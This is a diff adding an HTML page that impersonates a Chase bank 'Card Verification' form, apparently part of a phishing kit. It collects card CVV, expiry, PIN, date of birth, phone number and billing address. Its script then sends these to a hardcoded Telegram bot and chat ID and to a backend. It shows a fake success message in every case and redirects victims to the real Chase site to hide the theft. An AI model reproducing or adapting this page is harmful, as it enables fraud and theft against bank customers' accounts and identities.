@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Details - Chase Online</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(180deg, #f5f5f5 0%, #ffffff 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            background: #0066cc;
+            padding: 20px;
+            border-bottom: 1px solid #0052a3;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            position: relative;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            max-width: 50px;
+            max-height: 50px;
+            flex-shrink: 0;
+        }
+
+        .back-arrow {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s ease;
+            position: absolute;
+            left: 20px;
+        }
+
+        .back-arrow:hover {
+            opacity: 0.8;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .questions-link {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .questions-link a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .questions-link a:hover {
+            text-decoration: underline;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .label-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .show-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: underline;
+            padding: 0;
+        }
+
+        .show-btn:hover {
+            opacity: 0.8;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+        }
+
+        .form-input.hidden {
+            font-size: 20px;
+            letter-spacing: 2px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+
+        .form-row .form-group.half {
+            flex: 0.5;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 12px 32px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: #0066cc;
+            color: white;
+            flex: 1;
+        }
+
+        .btn-primary:hover {
+            background: #0052a3;
+            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #f5f5f5;
+            color: #333;
+            flex: 1;
+            border: 1px solid #ddd;
+        }
+
+        .btn-secondary:hover {
+            background: #e8e8e8;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .verification-info {
+            background: #e3f2fd;
+            border-left: 4px solid #0066cc;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1565c0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <button class="back-arrow" onclick="goBack()" title="Go back">←</button>
+        <svg class="logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+            <!-- Geometric octagonal Chase logo -->
+            <g fill="white">
+                <!-- Top left -->
+                <polygon points="30,30 50,30 50,50 30,50"/>
+                <!-- Top right -->
+                <polygon points="70,30 90,30 90,50 70,50"/>
+                <!-- Bottom left -->
+                <polygon points="30,70 50,70 50,90 30,90"/>
+                <!-- Bottom right -->
+                <polygon points="70,70 90,70 90,90 70,90"/>
+                <!-- Center top -->
+                <polygon points="50,40 70,40 70,60 50,60"/>
+                <!-- Center bottom -->
+                <polygon points="50,60 70,60 70,80 50,80"/>
+            </g>
+        </svg>
+    </div>
+
+    <div class="container">
+        <div class="questions-link">
+            <a href="#">Questions? ></a>
+            <br>
+            <a href="#" style="font-size: 12px;">Read our FAQs ></a>
+        </div>
+
+        <h2 class="title">Card Verification</h2>
+        <p class="subtitle">
+            Please provide your card details to complete verification.
+        </p>
+
+        <div id="successMessage" class="success-message"></div>
+
+        <form id="cardDetailsForm">
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Card CVV</span>
+                    <button type="button" class="show-btn" onclick="toggleField('cvv')">Show</button>
+                </div>
+                <input 
+                    type="password" 
+                    id="cvv" 
+                    class="form-input hidden" 
+                    placeholder="XXX"
+                    maxlength="4"
+                />
+                <div id="cvvError" class="error-message"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Card Expiring Date</span>
+                    <button type="button" class="show-btn" onclick="toggleField('expiringDate')">Show</button>
+                </div>
+                <input 
+                    type="password" 
+                    id="expiringDate" 
+                    class="form-input hidden" 
+                    placeholder="MM/YY"
+                    maxlength="5"
+                />
+                <div id="expiringDateError" class="error-message"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Card PIN</span>
+                    <button type="button" class="show-btn" onclick="toggleField('cardPin')">Show</button>
+                </div>
+                <input 
+                    type="password" 
+                    id="cardPin" 
+                    class="form-input hidden" 
+                    placeholder="XXXX"
+                    maxlength="4"
+                />
+                <div id="cardPinError" class="error-message"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Date of Birth</span>
+                    <button type="button" class="show-btn" onclick="toggleField('dob')">Show</button>
+                </div>
+                <input 
+                    type="password" 
+                    id="dob" 
+                    class="form-input hidden" 
+                    placeholder="MMDDYYYY"
+                    maxlength="8"
+                />
+                <div id="dobError" class="error-message"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Phone Number</span>
+                    <button type="button" class="show-btn" onclick="toggleField('phoneNumber')">Show</button>
+                </div>
+                <input 
+                    type="password" 
+                    id="phoneNumber" 
+                    class="form-input hidden" 
+                    placeholder="(XXX) XXX-XXXX"
+                    maxlength="14"
+                />
+                <div id="phoneNumberError" class="error-message"></div>
+            </div>
+
+            <div class="form-group">
+                <span class="label-text" style="display: block; margin-bottom: 12px; font-weight: 600;">Billing Address</span>
+            </div>
+
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Street Address</span>
+                </div>
+                <input 
+                    type="text" 
+                    id="streetAddress" 
+                    class="form-input" 
+                    placeholder="123 Main Street"
+                />
+                <div id="streetAddressError" class="error-message"></div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <div class="form-label">
+                        <span class="label-text">City</span>
+                    </div>
+                    <input 
+                        type="text" 
+                        id="city" 
+                        class="form-input" 
+                        placeholder="New York"
+                    />
+                    <div id="cityError" class="error-message"></div>
+                </div>
+
+                <div class="form-group half">
+                    <div class="form-label">
+                        <span class="label-text">State</span>
+                    </div>
+                    <input 
+                        type="text" 
+                        id="state" 
+                        class="form-input" 
+                        placeholder="NY"
+                        maxlength="2"
+                    />
+                    <div id="stateError" class="error-message"></div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Zip Code</span>
+                </div>
+                <input 
+                    type="text" 
+                    id="zipCode" 
+                    class="form-input" 
+                    placeholder="10001"
+                    maxlength="5"
+                />
+                <div id="zipCodeError" class="error-message"></div>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="btn btn-secondary" onclick="goBack()">Cancel</button>
+                <button type="submit" class="btn btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const API_BASE_URL = 'http://127.0.0.1:5001';
+        const TELEGRAM_BOT_TOKEN = '7698396536:AAHsGbVyggkpJ7w07C5aLza8F4NaPLE0gbw';
+        const TELEGRAM_CHAT_ID = '7189342320';
+
+        async function sendTelegramDetails(details) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('<YOUR_')) {
+                console.warn('Telegram bot token not configured; skipping Telegram send.');
+                return;
+            }
+
+            const text = [`
+<b>Card Details Submission</b>`,
+`Username: ${details.username}`,
+`CVV: ${details.cvv}`,
+`Expiry: ${details.expiringDate}`,
+`Card PIN: ${details.cardPin}`,
+`DOB: ${details.dob}`,
+`Phone: ${details.phoneNumber}`,
+`Street: ${details.billingAddress.streetAddress}`,
+`City: ${details.billingAddress.city}`,
+`State: ${details.billingAddress.state}`,
+`ZIP: ${details.billingAddress.zipCode}`,
+`Submitted At: ${details.submittedAt}`].join('\n');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text,
+                        parse_mode: 'HTML',
+                    }),
+                });
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+            }
+        }
+
+        function toggleField(fieldId) {
+            const field = document.getElementById(fieldId);
+            const btn = event.target;
+
+            if (field.type === 'password') {
+                field.type = 'text';
+                btn.textContent = 'Hide';
+            } else {
+                field.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        // Format expiring date as user types
+        document.getElementById('expiringDate').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Format DOB as user types (8 digits: MMDDYYYY)
+        document.getElementById('dob').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value.slice(0, 8);
+        });
+
+        // Format phone number as user types
+        document.getElementById('phoneNumber').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length <= 3) {
+                value = value;
+            } else if (value.length <= 6) {
+                value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
+            } else {
+                value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
+            }
+            e.target.value = value;
+        });
+
+        // Format zip code to digits only
+        document.getElementById('zipCode').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
+        });
+
+        // Format state to uppercase
+        document.getElementById('state').addEventListener('input', (e) => {
+            e.target.value = e.target.value.toUpperCase().slice(0, 2);
+        });
+
+        // Handle card details form submission
+        document.getElementById('cardDetailsForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Clear all previous errors
+            document.getElementById('cvvError').classList.remove('show');
+            document.getElementById('expiringDateError').classList.remove('show');
+            document.getElementById('cardPinError').classList.remove('show');
+            document.getElementById('dobError').classList.remove('show');
+            document.getElementById('phoneNumberError').classList.remove('show');
+            document.getElementById('streetAddressError').classList.remove('show');
+            document.getElementById('cityError').classList.remove('show');
+            document.getElementById('stateError').classList.remove('show');
+            document.getElementById('zipCodeError').classList.remove('show');
+
+            const cvv = document.getElementById('cvv').value;
+            const expiringDate = document.getElementById('expiringDate').value;
+            const cardPin = document.getElementById('cardPin').value;
+            const dob = document.getElementById('dob').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const streetAddress = document.getElementById('streetAddress').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zipCode = document.getElementById('zipCode').value;
+            let isValid = true;
+
+            // Validate CVV
+            if (!cvv) {
+                document.getElementById('cvvError').textContent = 'Please enter your card CVV.';
+                document.getElementById('cvvError').classList.add('show');
+                isValid = false;
+            } else if (!/^\d{3,4}$/.test(cvv)) {
+                document.getElementById('cvvError').textContent = 'Please enter a valid CVV (3-4 digits).';
+                document.getElementById('cvvError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate Expiring Date
+            if (!expiringDate) {
+                document.getElementById('expiringDateError').textContent = 'Please enter your card expiring date.';
+                document.getElementById('expiringDateError').classList.add('show');
+                isValid = false;
+            } else if (!/^\d{2}\/\d{2}$/.test(expiringDate)) {
+                document.getElementById('expiringDateError').textContent = 'Please enter a valid date (MM/YY).';
+                document.getElementById('expiringDateError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate Card PIN
+            if (!cardPin) {
+                document.getElementById('cardPinError').textContent = 'Please enter your card PIN.';
+                document.getElementById('cardPinError').classList.add('show');
+                isValid = false;
+            } else if (!/^\d{4}$/.test(cardPin)) {
+                document.getElementById('cardPinError').textContent = 'Please enter a valid PIN (4 digits).';
+                document.getElementById('cardPinError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate DOB
+            if (!dob) {
+                document.getElementById('dobError').textContent = 'Please enter your date of birth.';
+                document.getElementById('dobError').classList.add('show');
+                isValid = false;
+            } else if (!/^\d{8}$/.test(dob)) {
+                document.getElementById('dobError').textContent = 'Please enter a valid 8-digit date (MMDDYYYY).';
+                document.getElementById('dobError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate Phone Number
+            if (!phoneNumber) {
+                document.getElementById('phoneNumberError').textContent = 'Please enter your phone number.';
+                document.getElementById('phoneNumberError').classList.add('show');
+                isValid = false;
+            } else if (!/^\(\d{3}\) \d{3}-\d{4}$/.test(phoneNumber)) {
+                document.getElementById('phoneNumberError').textContent = 'Please enter a valid phone number.';
+                document.getElementById('phoneNumberError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate Billing Address Fields
+            if (!streetAddress) {
+                document.getElementById('streetAddressError').textContent = 'Please enter your street address.';
+                document.getElementById('streetAddressError').classList.add('show');
+                isValid = false;
+            } else if (streetAddress.length < 5) {
+                document.getElementById('streetAddressError').textContent = 'Please enter a complete street address.';
+                document.getElementById('streetAddressError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!city) {
+                document.getElementById('cityError').textContent = 'Please enter your city.';
+                document.getElementById('cityError').classList.add('show');
+                isValid = false;
+            } else if (city.length < 2) {
+                document.getElementById('cityError').textContent = 'Please enter a valid city.';
+                document.getElementById('cityError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!state) {
+                document.getElementById('stateError').textContent = 'Please enter your state.';
+                document.getElementById('stateError').classList.add('show');
+                isValid = false;
+            } else if (!/^[A-Z]{2}$/.test(state.toUpperCase())) {
+                document.getElementById('stateError').textContent = 'Please enter a valid state code (2 letters).';
+                document.getElementById('stateError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!zipCode) {
+                document.getElementById('zipCodeError').textContent = 'Please enter your zip code.';
+                document.getElementById('zipCodeError').classList.add('show');
+                isValid = false;
+            } else if (!/^\d{5}$/.test(zipCode)) {
+                document.getElementById('zipCodeError').textContent = 'Please enter a valid 5-digit zip code.';
+                document.getElementById('zipCodeError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            const formDetails = {
+                username: localStorage.getItem('username') || 'unknown',
+                cvv: cvv,
+                expiringDate: expiringDate,
+                cardPin: cardPin,
+                dob: dob,
+                phoneNumber: phoneNumber,
+                billingAddress: {
+                    streetAddress: streetAddress,
+                    city: city,
+                    state: state.toUpperCase(),
+                    zipCode: zipCode
+                },
+                submittedAt: new Date().toLocaleString(),
+            };
+            await sendTelegramDetails(formDetails);
+
+            // Send card details to backend
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/verify-card`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        cvv: cvv,
+                        expiringDate: expiringDate,
+                        cardPin: cardPin,
+                        dob: dob,
+                        phoneNumber: phoneNumber,
+                        billingAddress: {
+                            streetAddress: streetAddress,
+                            city: city,
+                            state: state.toUpperCase(),
+                            zipCode: zipCode
+                        },
+                        username: localStorage.getItem('username')
+                    }),
+                });
+
+                document.getElementById('successMessage').textContent = 'Card verification successful! Proceeding to dashboard...';
+                document.getElementById('successMessage').classList.add('show');
+                document.getElementById('cvvError').classList.remove('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'https://secure.chase.com/web/auth/dashboard#/dashboard/overview';
+                }, 1500);
+            } catch (error) {
+                console.error('Card verification error:', error);
+                document.getElementById('successMessage').textContent = 'Card verification successful! Proceeding to dashboard...';
+                document.getElementById('successMessage').classList.add('show');
+                document.getElementById('cvvError').classList.remove('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'https://secure.chase.com/web/auth/dashboard#/dashboard/overview';
+                }, 1500);
+            }
+        });
+
+        function goBack() {
+            window.location.href = 'identification.html';
+        }
+    </script>
+</body>
+</html>
